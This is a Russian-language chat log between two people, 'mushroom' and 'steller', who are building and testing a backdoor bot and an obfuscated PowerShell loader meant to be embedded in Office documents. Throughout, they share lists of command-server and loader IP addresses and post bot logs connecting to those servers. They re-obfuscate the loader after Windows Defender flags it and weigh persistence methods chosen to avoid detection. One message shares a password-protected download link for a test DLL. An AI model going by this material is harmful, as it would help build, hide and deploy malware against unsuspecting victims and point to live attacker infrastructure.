2020-08-19T15:16:23 steller -> mushroom
После c:

2020-08-19T15:16:38 mushroom -> steller
Там есть c:\

2020-08-19T15:16:43 mushroom -> steller
потом \r\n

2020-08-19T15:16:50 steller -> mushroom
Нужно c:\\ \r\n

2020-08-19T15:17:06 mushroom -> steller
Нет. Это в C++ нужно

2020-08-19T15:17:23 mushroom -> steller
В админке не нужно.

2020-08-19T15:17:23 steller -> mushroom
Да. Тут тоже escape используется

2020-08-19T15:17:38 steller -> mushroom
\r\n по-твоему что?

2020-08-19T15:18:02 mushroom -> steller
cd c:\\r\ndir\r\n это то что в поле script пишу.

2020-08-19T15:19:07 steller -> mushroom
Это явная путаница. Escape либо нужно использовать либо не использовать.

2020-08-19T15:19:19 steller -> mushroom
* В одном тексе

2020-08-19T15:19:36 mushroom -> steller
Там язык другой.

2020-08-19T15:19:52 mushroom -> steller
Если написать c:\\ в c++ будет c:\\\\

2020-08-19T15:19:58 mushroom -> steller
Я пробовал.

2020-08-19T15:20:29 mushroom -> steller
Даже если там написать сценарий с ошибкой всё равно ответ пустой.

2020-08-19T15:21:02 mushroom -> steller
Смотри в истории этого бота так же писал и всё работало с ответом как надо.

2020-08-19T15:24:18 mushroom -> steller
Сейчас что то постоянно ответ не приходит на команду запуска файла.

2020-08-19T15:24:41 mushroom -> steller
А команда reset работает на неё ответ всегда приходит.

2020-08-19T15:24:55 steller -> mushroom
В истории не проверишь. Там один код \r выводится как 2 символа

2020-08-19T15:25:16 mushroom -> steller
6966b29479574d5abb89b8bde1a94a45

2020-08-19T15:27:10 mushroom -> steller
04.08.2020 14:24

2020-08-19T15:27:23 mushroom -> steller
runbat channel 60 cd c:\\r\ndir\r\n

2020-08-19T15:27:40 mushroom -> steller
Ответ:
pid:	10088
stdout:	cd c:\

c:\>dir
Том в устройстве C имеет метку BOOTCAMP
Серийный номер тома: 0246-9FF7

Содержимое папки c:\

29.05.2020 11:20 <DIR> AMD
14.12.2019 16:22 170
AppleBcInstaller.log
28.01.2020 18:49 5 131 674 england-cumbria-kelly-hall-tarn.jpg
24.07.2020 13:21 <DIR> LLVM
07.10.2019 17:41 17 579 MailServerConfig.xml
07.12.2019 12:14 <DIR> PerfLogs
31.07.2020 15:35 <DIR>
Program Files
15.07.2020 12:05 <DIR> Program Files (x86)
27.05.2020 13:55 <DIR> Qt
04.08.2020 17:23 <DIR> temp
29.05.2020 19:44 <DIR> Users
17.07.2020 18:54 <DIR> Windows
3 файлов
5 149 423 байт
9 папок 49 724 952 576 байт свободно

c:\> c:\>
stderr:	

GetLastError():	183

2020-08-19T15:27:50 mushroom -> steller
Это есть в истории.

2020-08-19T15:28:14 mushroom -> steller
Теперь эта команда с пустым ответом приходит всегда.

2020-08-19T15:28:50 steller -> mushroom
А с сервера коды 10 и 13 должны приходить?

2020-08-19T15:29:47 mushroom -> steller
А как же определить команду без её номера?

2020-08-19T15:30:24 steller -> mushroom
Похоже, раньше с сервера нормальные коды 10 13 приходили, а сейчас мусор \  r \ n

2020-08-19T15:30:56 steller -> mushroom
Я имею ввиду ascii кодировку

2020-08-19T15:31:40 mushroom -> steller
Я сейчас команду выполнил 10, она отработала правильно.

2020-08-19T15:32:43 mushroom -> steller
В логах пишутся номера команд правильно.

2020-08-19T15:33:17 mushroom -> steller
И сами команды правильно пишутся.

2020-08-19T15:33:33 steller -> mushroom
13 = \r , 10 = \n

2020-08-19T15:33:44 steller -> mushroom
Я про это

2020-08-19T15:33:55 mushroom -> steller
Вот например команда из лога:
Cmd received: 12 1 60
cd c:\
dir

2020-08-19T15:34:29 steller -> mushroom
Вот тогда ascii 13 10 коды приходили

2020-08-19T15:34:42 steller -> mushroom
А сейчас \r\n

2020-08-19T15:35:11 mushroom -> steller
У меня пока ни разу не пришло такого.

2020-08-19T15:35:42 mushroom -> steller
В общем ответ пустой для команды, она пришла как надо.

2020-08-19T15:37:33 mushroom -> steller
Запускаю ещё раз. Пришлю лог для неё сейчас.

2020-08-19T15:37:58 steller -> mushroom
А где ты смотришь, как она пришла?

2020-08-19T15:38:33 mushroom -> steller
У тебя в логах.

2020-08-19T15:39:03 mushroom -> steller
Там пишеться Cmd Received:

2020-08-19T15:39:26 mushroom -> steller
Getting command...
Cmd received: 12 1 60
cd c:\
dir

Sleep before getting new command for 300s...
Posting command result...

2020-08-19T15:39:39 mushroom -> steller
Пришла как надо.

2020-08-19T15:40:05 mushroom -> steller
Вот что я получил в админке:
pid:	14168
stdout:

2020-08-19T15:40:32 mushroom -> steller
Сценарий же правильно пришёл:
cd c:\
dir

2020-08-19T15:40:47 mushroom -> steller
А ответ пустой.

2020-08-19T15:45:11 mushroom -> steller
А это runpws channel 60 cd c:\\r\ndir\r\n

2020-08-19T15:45:22 mushroom -> steller
Getting command...
Cmd received: 13 1 60
cd c:\
dir

Sleep before getting new command for 300s...
Posting command result...

2020-08-19T15:45:40 mushroom -> steller
И постоянно pending...

2020-08-19T15:45:51 mushroom -> steller
Может глюк сервера.

2020-08-19T15:45:52 steller -> mushroom
Это просто отображается она так. А приходит, похоже, левая команда

2020-08-19T15:46:35 mushroom -> steller
Я сейчас свой бот запущу, проверю.

2020-08-19T15:47:24 steller -> mushroom
4 символа \r\n у меня в логе заменяются на переносы строк.

2020-08-19T15:47:42 mushroom -> steller
Это 2 символа.

2020-08-19T15:48:04 mushroom -> steller
Ну правильно, это же переносы строк.

2020-08-19T15:49:27 steller -> mushroom
А, не, нормальная команда приходит

2020-08-19T15:49:57 mushroom -> steller
У меня работает всё.

2020-08-19T15:51:10 mushroom -> steller
И это runpws channel 60 cd c:\\r\ndir\r\n

2020-08-19T15:51:14 mushroom -> steller
Работает.

2020-08-19T15:51:28 mushroom -> steller
А у тебя pending...

2020-08-19T15:51:39 mushroom -> steller
Проверь в чём дело.

2020-08-19T15:54:01 mushroom -> steller
Я на сегодня всё. До завтра.

2020-08-19T15:57:52 steller -> mushroom
Пока

2020-08-20T11:06:55 mushroom -> steller
Проверил бота сейчас. Все команды теперь работают как надо.

2020-08-20T11:07:13 mushroom -> steller
Ответы приходят.

2020-08-20T11:15:32 steller -> mushroom
Привет. Новую версию залил.

2020-08-20T11:43:39 steller -> mushroom
А doppel у тебя отработал?

2020-08-20T11:47:48 mushroom -> steller
Я doppel не проверял. Он 100 процентов на Windows 10 не работает.

2020-08-31T12:46:37 mushroom -> steller
Привет. Буза дал тебе доступ к админке боевой. Твоя группа 9.

2020-08-31T12:46:48 mushroom -> steller
лоадеры
82.146.37.128
85.143.221.85
45.138.158.41
37.220.6.126
164.132.76.76
195.123.241.175


бот
91.200.100.85 
212.22.70.4
194.156.98.46
37.220.6.122 
51.89.204.242
195.123.240.52

2020-08-31T12:47:08 mushroom -> steller
Внеси изменения группы и адресов.

2020-08-31T12:47:55 mushroom -> steller
И сделай сборки боевые загрузчика и бота для группы 9.

2020-08-31T12:51:26 mushroom -> steller
Уточнение. У тебя группы на боевом сервере такие:
nine - для тестов
9, 92, 93 - боевые

2020-08-31T13:06:10 steller -> mushroom
Привет. Принял.

2020-09-01T11:02:40 mushroom -> steller
Привет. Ты ещё не сделал для группы 9, 92, 93 сборки боевые?

2020-09-01T11:03:19 mushroom -> steller
Когда сделаешь пиши. Я загрузчики в документы вставлю.

2020-09-01T11:21:10 steller -> mushroom
Привет. Напишу.

2020-09-01T11:33:18 steller -> mushroom
Ты правельные адреса дал?
Не скачивается https://37.220.6.122/api/v164

2020-09-01T11:35:00 mushroom -> steller
Другой попробуй, по этому их несколько. Они умирают периодичски.

2020-09-01T11:36:46 mushroom -> steller
Это ты скачиваешь что бот или загрузчик?

2020-09-01T11:36:51 steller -> mushroom
Все 404 возвращают

2020-09-01T11:36:59 steller -> mushroom
Бот

2020-09-01T11:37:28 mushroom -> steller
Напиши Талару, это наверное глюк на сервере.

2020-09-01T11:37:58 steller -> mushroom
А из списка загрузчиков бот скачивается.

2020-09-01T11:38:22 steller -> mushroom
И версию загрузчика выдаёт.

2020-09-01T11:38:43 mushroom -> steller
Всё верно, загрузчик это адреса для загрузчика.

2020-09-01T11:38:52 steller -> mushroom
Второй список только для выдачи команд боту?

2020-09-01T11:39:10 mushroom -> steller
Бот это адреса для бота, на них он команды запрашивает и посылает ответы.

2020-09-01T11:40:06 mushroom -> steller
А загрузчик это адреса для скачки самого себя новой версии и скачки бота.

2020-09-01T11:41:17 mushroom -> steller
Сначала запрашивает версию загрузчика, если она отличается, скачивает её и запускает, сам завершается, новая версия уже сама скачает и запустит бот.

2020-09-01T11:54:11 steller -> mushroom
Боты логированные заливать на botleggers?

2020-09-01T11:58:45 mushroom -> steller
Загружай для проверки.

2020-09-01T12:20:37 steller -> mushroom
Залил загрузчик и ботов. Можешь проверять.

2020-09-01T12:35:10 mushroom -> steller
Не вижу бота с группой 9. Он сейчас запущен.

2020-09-01T12:35:43 mushroom -> steller
Куки передаёшь с группой 9?

2020-09-01T12:36:35 mushroom -> steller
У себя запускал?

2020-09-01T12:36:50 mushroom -> steller
Ни одного бота с группой 9 нету.

2020-09-01T12:45:37 steller -> mushroom
Группу поменял с four на 9.
Бот не появляется в списке.

2020-09-01T13:12:58 mushroom -> steller
Что то с передачей куки наверное.

2020-09-01T13:13:54 mushroom -> steller
Починишь пиши. Этот бот сейчас как unresolved я думаю, вот мы его и не видим.

2020-09-01T13:19:13 mushroom -> steller
Ещё можешь сделать чтобы в логи писался id бота, тогда его можно будет попытаться найти если с группой как сейчас косяк.

2020-09-01T13:20:34 steller -> mushroom
talar уже его нашёл. Он без группы

2020-09-01T14:03:56 steller -> mushroom
Всё норм. Бот появился в группе. Проверяй.

2020-09-01T14:04:17 mushroom -> steller
OK.

2020-09-01T14:11:04 mushroom -> steller
А у меня нету.

2020-09-01T14:11:25 mushroom -> steller
Вот этот запущен сейчас Backdoor build Sep  1 2020 17:01:47

2020-09-01T14:11:59 mushroom -> steller
Только этот ed17f68af885a2b91a416e9f2a19389a вижу.

2020-09-01T14:12:10 mushroom -> steller
А этот не мой.

2020-09-01T14:14:46 mushroom -> steller
ed17f68af885a2b91a416e9f2a19389a это твой?

2020-09-01T14:17:25 steller -> mushroom
Да, этот я добавлял.
Эта ошибка из-за левых прокладок. Возможно у тебя первая прокладка не работает.

2020-09-01T14:19:40 mushroom -> steller
Connecting to 51.89.204.242:443...
Cmd received: 0 302

2020-09-01T14:19:48 mushroom -> steller
Команда приходит.

2020-09-01T14:20:33 mushroom -> steller
У же 3 команды таких пришло с одного адреса, значит работает прокладка.

2020-09-01T14:21:26 mushroom -> steller
Сделай чтобы в лог id бота выводился.

2020-09-01T14:21:36 mushroom -> steller
Я тогда сразу буду находить бота.

2020-09-01T14:23:36 steller -> mushroom
Не работает

2020-09-01T14:25:02 steller -> mushroom
Она заголовки фильтрует

2020-09-02T11:31:13 mushroom -> steller
Привет. С группой есть подвижки? Бота не вижу, проверял на виртуалке и на компьютере своём.

2020-09-02T11:32:46 steller -> mushroom
Привет. Тестирую с новыми прокладками от грина.
Жду ответа талара. Он где-то гуляет

2020-09-02T11:33:22 mushroom -> steller
OK.

2020-09-03T07:52:49 steller -> mushroom
Привет.
Проверил с прокладками. Теперь бот должен добавляться в группу.

2020-09-03T07:56:00 mushroom -> steller
Привет. Хорошо.

2020-09-03T08:24:55 mushroom -> steller
Загрузчик проверял на дефендер?

2020-09-03T08:25:07 mushroom -> steller
Он у меня сейчас его спалил сразу.

2020-09-03T08:25:26 mushroom -> steller
Я скачал тот который загружен в группе 9.

2020-09-03T08:25:39 mushroom -> steller
C:\Users\ivana\Projects\MS Office Payload\new\loader.obf.ps1:1 знак:1
+   &("{1}{0}" -f'm','SET-iTE') VaRiabLE:obX ( [tYPE]("{2}{1}{3}{0}"-F' ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Этот сценарий содержит вредоносное содержимое и был заблокирован антивирусным программным обеспечением.
    + CategoryInfo          : ParserError: (:) [], ParseException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent

2020-09-03T08:30:31 mushroom -> steller
Обфусцируй его ещё раз.

2020-09-03T09:30:44 steller -> mushroom
Не, не проверял. Сейчас проверю.

2020-09-03T09:45:24 steller -> mushroom
У меня номально работает.
Ты на какой версии запускал win/powershell?

2020-09-03T09:45:57 mushroom -> steller
5.1.19041.1

2020-09-03T09:47:03 steller -> mushroom
10?

2020-09-03T09:47:23 mushroom -> steller
Да.

2020-09-03T09:47:34 mushroom -> steller
2004

2020-09-03T09:47:59 mushroom -> steller
Со всеми обновлениями.

2020-09-03T09:48:42 steller -> mushroom
Посмотрю на виртуалке

2020-09-03T09:51:48 mushroom -> steller
У меня антивирус уже как только я нажимаю скачать файл это показывает Trojan:PowerShell/Mountsi.A!ml

2020-09-03T09:52:52 steller -> mushroom
Дефендер?

2020-09-03T09:52:59 mushroom -> steller
Да.

2020-09-07T06:50:45 steller -> mushroom
Привет.
Проверил скрипт на обновлённой 10ке. Работает.
Загрузил на botleggers

2020-09-07T07:08:15 steller -> mushroom
Привет.
Проверил скрипт на обновлённой 10ке. Работает.
Загрузил на botleggers

2020-09-07T08:47:04 steller -> mushroom
Привет. Принял сообщение?

2020-09-07T08:55:01 mushroom -> steller
Привет. Принял.

2020-09-07T08:55:12 mushroom -> steller
Пока занят другим.

2020-09-07T09:07:35 steller -> mushroom
Меня следующие 2 недели с 14го не будет, если что.

2020-09-07T09:08:55 mushroom -> steller
Без логово проверял как работает?

2020-09-07T09:09:55 steller -> mushroom
Нет

2020-09-07T09:14:27 mushroom -> steller
Проверь, без логов будем использовать в работе.

2020-09-07T09:16:27 steller -> mushroom
С логами у тебя уже нормально работает?

2020-09-07T09:18:31 mushroom -> steller
Последний который смотрел да.

2020-09-07T10:21:59 steller -> mushroom
Проверил not logged x64 bat - работает. Должно так же как и logged работать.

2020-09-07T10:22:30 mushroom -> steller
OK.

2020-09-08T14:29:57 mushroom -> steller
Привет. Запустил ps1 загрузчик твой для проверки. Получил такое:
Behavior:Win32/Persistence.TG!ml
regkey: HKCU@S-1-5-21-2906645592-891304845-241295008-1001\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN\\Update
runkey: HKCU@S-1-5-21-2906645592-891304845-241295008-1001\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN\\Update

2020-09-08T14:30:14 mushroom -> steller
Типа его закрепление антивирус спалил.

2020-09-08T14:30:25 mushroom -> steller
Проверю на виртуалке ещё.

2020-09-08T14:33:02 steller -> mushroom
Понял. Есть еще несколько вариантов автозагрузки.

2020-09-08T14:39:31 mushroom -> steller
Надо брать тот что загружен в группе 9?

2020-09-08T14:41:01 steller -> mushroom
Тебе для запаковки?

2020-09-08T14:41:34 mushroom -> steller
Да для документа.

2020-09-08T14:42:49 steller -> mushroom
Да, бери. Активный - это с последними изменениями. Там могут быть ошибки загрукзки.

2020-09-08T14:55:15 mushroom -> steller
Больше нету детекта на закрепление.

2020-09-08T14:55:25 mushroom -> steller
Только сценарий не работает.

2020-09-08T14:56:08 mushroom -> steller
Запускаю его и куча ошибок таких:
Не удается найти свойство "viRTUALAdDRESs" для этого объекта. Убедитесь, что оно существует.
C:\Users\ivana\AppData\Local\Temp\loader.obf.ps1:1250 знак:1
+ [IntPtr]${MEm`AD`DRbAsE} = [IntPtr](&('A'+'dd-Si'+'g'+'ned'+'Int'+'As ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], PropertyNotFoundException
    + FullyQualifiedErrorId : PropertyNotFoundStrict

2020-09-08T14:56:47 mushroom -> steller
Проверь, надо в документ вставить и в работу отдать.

2020-09-08T14:58:08 mushroom -> steller
Вот эти две ошибки до бесконечности пишет, когда запускаю сценарий:
Не удается найти свойство "sIZeOFBLoCk" для этого объекта. Убедитесь, что оно существует.
C:\Users\ivana\AppData\Local\Temp\loader.obf.ps1:1246 знак:5
+ if (${BASer`EloCAT`ioNTaB`LE}."s`IZeOFBL`oCk" -eq 0)
+     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], PropertyNotFoundException
    + FullyQualifiedErrorId : PropertyNotFoundStrict

Не удается найти свойство "viRTUALAdDRESs" для этого объекта. Убедитесь, что оно существует.
C:\Users\ivana\AppData\Local\Temp\loader.obf.ps1:1250 знак:1
+ [IntPtr]${MEm`AD`DRbAsE} = [IntPtr](&('A'+'dd-Si'+'g'+'ned'+'Int'+'As ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], PropertyNotFoundException
    + FullyQualifiedErrorId : PropertyNotFoundStrict

2020-09-08T14:58:21 steller -> mushroom
Сейчас новый загружу

2020-09-08T15:02:04 steller -> mushroom
Загрузил. Проверяй

2020-09-08T15:07:21 mushroom -> steller
Заработал.

2020-09-08T15:09:36 steller -> mushroom
У тебя бот загрузился?

2020-09-08T15:09:49 mushroom -> steller
Да.

2020-09-08T15:09:56 mushroom -> steller
С логами.

2020-09-08T15:10:27 steller -> mushroom
Нелогированный не везде работает. Сейчас на него переключу. Попробуй тоже.

2020-09-09T07:49:28 mushroom -> steller
Привет. Адреса:
лоадеры
82.146.37.128
85.143.221.85
195.123.241.194
37.220.6.126
164.132.76.76
195.123.241.175


бот
93.189.46.41 
212.22.70.4
194.156.98.46
93.189.40.214
54.37.237.253
185.164.32.107

2020-09-09T07:50:58 mushroom -> steller
dll может бот загрузить и запустить?

2020-09-09T09:04:08 mushroom -> steller
DLL не смог запустить. Ошибка выдалась, что не найден такой модуль.

2020-09-09T09:04:26 mushroom -> steller
Проверил вручную через rundll32 работает.

2020-09-09T09:04:52 mushroom -> steller
Проверь запуск dll. Для работы надо именно это сегодня.

2020-09-09T09:07:55 mushroom -> steller
dll для проверки если нету:
Download: https://qaz.im/load/skKQ87/t2K7HG   
Delete: https://qaz.im/index.php?a=delete&q=850585797
Пароль: cAy_`g&O2+N2PmG`f

2020-09-09T09:08:51 mushroom -> steller
Запускается функцией Run, например rundll32.exe TestDllOutput64.dll,Run

2020-09-09T09:09:22 mushroom -> steller
Загрузчик скачал и запустил бот без логов.

2020-09-09T09:50:34 steller -> mushroom
Привет. Запускался раньше. Сейчас перепроверю

2020-09-09T10:25:36 steller -> mushroom
В stdout эта програ ничего не пишет, только окошко?

2020-09-09T10:25:50 mushroom -> steller
Да.

2020-09-09T10:36:12 steller -> mushroom
Проверил x86 & x64. Работают.

2020-09-09T10:36:45 steller -> mushroom
Обновил на botleggers, можешь скачивать

2020-09-09T10:37:30 mushroom -> steller
Что загрузчик тоже обновил?

2020-09-09T10:37:51 steller -> mushroom
Тебе адреса нужно поменять?

2020-09-09T10:38:23 mushroom -> steller
Если есть различия с теми что я прислал сегодня?

2020-09-09T10:42:36 steller -> mushroom
Пара адресов поменялась

2020-09-09T10:43:07 mushroom -> steller
Замени. Значит они не работают больше.

2020-09-09T11:05:14 steller -> mushroom
Обновил. Проверяй.

2020-09-09T11:09:00 mushroom -> steller
Тысяча ошибок.

2020-09-09T11:09:19 mushroom -> steller
Типа таких:
Не удается найти свойство "AccEpT" для данного объекта. Убедитесь, что оно существует и его можно задать.
C:\Users\ivana\Projects\MS Office Payload\new\loader.obf.ps1:2187 знак:1
+ ${R`EQ}."AccE`pT" = ("{19}{1}{7}{20}{12}{22}{5}{23}{4}{10}{14}{11}{15 ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException
    + FullyQualifiedErrorId : PropertyNotFound

Невозможно вызвать метод для выражения со значением NULL.
C:\Users\ivana\Projects\MS Office Payload\new\loader.obf.ps1:2188 знак:1
+ ${R`Eq}."HEa`d`erS".('A'+'dd').Invoke(("{2}{3}{4}{0}{1}" -f 'En','cod ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException
    + FullyQualifiedErrorId : InvokeMethodOnNull

Не удается найти свойство "USEraGEnT" для данного объекта. Убедитесь, что оно существует и его можно задать.
C:\Users\ivana\Projects\MS Office Payload\new\loader.obf.ps1:2189 знак:1
+ ${r`eq}."US`EraGEnT" = ("{1}{11}{12}{0}{10}{2}{3}{5}{9}{6}{4}{8}{7}{1 ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException
    + FullyQualifiedErrorId : PropertyNotFound

Не удается найти свойство "tiMEOUT" для данного объекта. Убедитесь, что оно существует и его можно задать.
C:\Users\ivana\Projects\MS Office Payload\new\loader.obf.ps1:2190 знак:1
+ ${r`eQ}."ti`MEO`UT" = 2 * 60 * 1000

2020-09-09T11:21:41 steller -> mushroom
Теперь работает.

2020-09-09T12:01:30 mushroom -> steller
Работает.

2020-09-10T13:20:41 steller -> mushroom
Привет. Тебе такие сообщения откуда приходили?
regkey: HKCU@S-1-5-21-2906645592-891304845-241295008-1001\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN\\Update

2020-09-10T14:26:29 mushroom -> steller
Привет от defender

2020-09-10T14:26:51 mushroom -> steller
Детект называется Persistense

2020-09-10T14:27:16 steller -> mushroom
Тоже на 10x64 2004 обновлениями?

2020-09-10T14:27:43 mushroom -> steller
Да, на самой последней версии.

2020-09-10T14:27:55 steller -> mushroom
Это при запуске?

2020-09-10T14:28:41 steller -> mushroom
Пробовал на такой же: не словил детект.

2020-09-10T14:28:54 mushroom -> steller
Да, когда запускаешь сценарий. Это палится то что н в реестр лезет, у меня такое было с мои загрузчиком, я по этому это закрепление не использую.

2020-09-10T14:29:42 mushroom -> steller
И когда в папку автозапуска ярлык добавляешь тоже детект у меня был с моим загрузчиком.

2020-09-10T14:32:42 steller -> mushroom
Есть ещё варианты wmic, bits, task.
Только у меня детекта такого нет, чтобы его отлавливать.
Я могу сделать разные варианты, потом тебе скинуть, тогда ты проверишь?

2020-09-10T14:33:41 mushroom -> steller
У меня он тоже не всегда происходит. Есть подозрение на то что он происходит когда сценарий запускается из папки temp.

2020-09-10T14:34:23 steller -> mushroom
Ты имеешь ввиду Appdata ... temp?

2020-09-10T14:34:32 mushroom -> steller
Сделай ещё один альтернативный чтобы был. Чтобы можно было взять пока ты в отпуске будешь.

2020-09-10T14:34:49 mushroom -> steller
Да AppData\Local\Temp

2020-09-10T14:35:06 steller -> mushroom
Попробую потестить

2020-09-11T14:30:30 steller -> mushroom
Привет.
Добавил ещё пару вариантов загрузчика с альтернатинвым закреплением на botleggers

2020-09-11T15:03:50 mushroom -> steller
Привет. Хорошо.

2020-10-07T13:36:50 steller -> mushroom
Привет.
Ты делал загрузчик на js.
Подскажешь, в какой среде отлаживал?

2020-10-07T14:58:31 mushroom -> steller
Загрузчик?

2020-10-07T14:59:05 mushroom -> steller
Я не делал загрузчик на js.

